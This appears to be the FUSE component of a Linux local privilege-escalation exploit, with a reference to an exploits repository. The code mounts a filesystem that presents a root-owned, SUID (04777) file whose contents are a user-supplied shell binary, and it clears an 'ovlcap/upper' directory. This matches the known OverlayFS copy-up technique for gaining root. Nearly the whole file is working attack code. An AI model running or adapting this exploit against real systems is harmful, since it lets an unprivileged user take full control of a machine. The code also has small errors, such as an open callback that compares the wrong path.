#define FUSE_USE_VERSION 29  
#include <errno.h>           
#include <fuse.h>            
#include <stdio.h>          
#include <string.h>         
#include <stdlib.h>          
#include <sched.h>          
#include <sys/mman.h>       
#include <pthread.h>         

//References:
//https://github.com/Anekant-Singhai/Exploits

// Global variables for file content and paths
char content[0x100000];       // Buffer to hold file content
int clen;                     // Length of the content
static char mount_path[0x100]; // Path to the mount point
static char shell_path[0x100]; // Path to the shell script/file
static int cnt = 0;           // Counter for tracking operations

// Callback for file attributes (similar to `stat` system call)
static int getattr_callback(const char *path, struct stat *stbuf) {
    puts("[+] getattr_callback");
    memset(stbuf, 0, sizeof(struct stat)); // Clear stat structure

    if (strcmp(path, "/file") == 0) { // Attributes for "/file"
        puts(path);
        stbuf->st_mode = S_IFREG | 04777; // Regular file with SUID permissions
        stbuf->st_nlink = 1;             // Single hard link
        stbuf->st_uid = 0;               // Owned by root
        stbuf->st_gid = 0;               // Group is root
        stbuf->st_size = clen;           // Set file size
        return 0;
    } else if (strcmp(path, "/") == 0) { // Attributes for root directory
        puts(path);
        stbuf->st_mode = S_IFDIR | 0777; // Directory with full permissions
        stbuf->st_nlink = 2;            // Two links (itself and "..")
        stbuf->st_uid = 1000;           // Default user ID
        stbuf->st_gid = 1000;           // Default group ID
        return 0;
    }
    return -ENOENT; // File not found
}

// Callback for opening a file
static int open_callback(const char *path, struct fuse_file_info *fi) {
    puts("[+] open_callback");
    puts(path);
    if (strcmp(path, "file") == 0) {
        int fd = open("", fi->flags); // Open the file
        return -errno;               // Return error if applicable
    }
    return 0;
}

// Callback for reading file content
static int read_callback(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
    puts("[+] read_callback");
    printf("    cnt  : %d\n", cnt);
    printf("    content  : %s\n", content);
    printf("    clen  : %d\n", clen);
    printf("    path  : %s\n", path);
    printf("    size  : 0x%lx\n", size);
    printf("    offset: 0x%lx\n", offset);

    if (strcmp(path, "/file") == 0) {
        size_t len = clen;
        if (offset >= len) return 0; // End of file
        if ((size > len) || (offset + size > len)) {
            memcpy(buf, content + offset, len - offset);
            return len - offset;
        } else {
            memcpy(buf, content + offset, size);
            return size;
        }
    }
    return -ENOENT;
}

// Callback for reading into a buffer
int read_buf_callback(const char *path, struct fuse_bufvec **bufp, size_t size, off_t off, struct fuse_file_info *fi) {
    puts("[+] read_buf_callback");
    printf("offset %d\n", off);
    printf("size %d\n", size);
    printf("path %s\n", path);

    struct fuse_bufvec *src = malloc(sizeof(struct fuse_bufvec));
    if (!src) return -ENOMEM;

    *src = FUSE_BUFVEC_INIT(size);
    char *data = malloc(size);
    memset(data, 0, size);
    memcpy(data, content, size);

    src->buf[0].flags = FUSE_BUF_FD_SEEK; // File seek flags
    src->buf[0].pos = off;
    src->buf[0].mem = data;

    *bufp = src;
    return 0;
}

// Callback for IOCTL operations
static int ioctl_callback(const char *p, int cmd, void *arg, struct fuse_file_info *fi, unsigned int flags, void *data) {
    puts("[+] ioctl callback");
    printf("path %s\n", p);
    printf("cmd 0x%x\n", cmd);
    return 0;
}

// Callback for reading directory contents
static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
    puts("[+] readdir");
    filler(buf, "file", NULL, 0); // Add "file" to directory listing
    return 0;
}

// Define FUSE operations structure
static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
    .read_buf = read_buf_callback,
    .ioctl = ioctl_callback,
    .readdir = readdir_callback,
};


// Error handler that prints the error and exits
void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

// Start the FUSE filesystem
void start_fuse() {
    if (mkdir(mount_path, 0777)) perror("mkdir");

    system("rm -rf ./ovlcap/upper/*");

    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;

    if (!(chan = fuse_mount(mount_path, &args))) fatal("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
        fuse_unmount(mount_path, chan);
        fatal("fuse_new");
    }

    fuse_set_signal_handlers(fuse_get_session(fuse)); // Setup signal handlers
    fuse_loop_mt(fuse);                               // Monitor file system events
    fuse_unmount(mount_path, chan);
}

int main(int argc, char const *argv[]) {
    if (argc < 3) {
        puts("[-] usage:");
        puts("./fuse [mount path] [shell path]");
        return -1;
    }
    strcpy(mount_path, argv[1]);
    strcpy(shell_path, argv[2]);

    int fd = open(shell_path, O_RDONLY);
    if (fd < 0) fatal("open shell_path");

    clen = 0;
    while (read(fd, content + clen, 1) > 0) clen++;
    close(fd);

    printf("[+] len of content: 0x%x\n", clen);

    start_fuse();
    rmdir(mount_path);
    return 0;
}
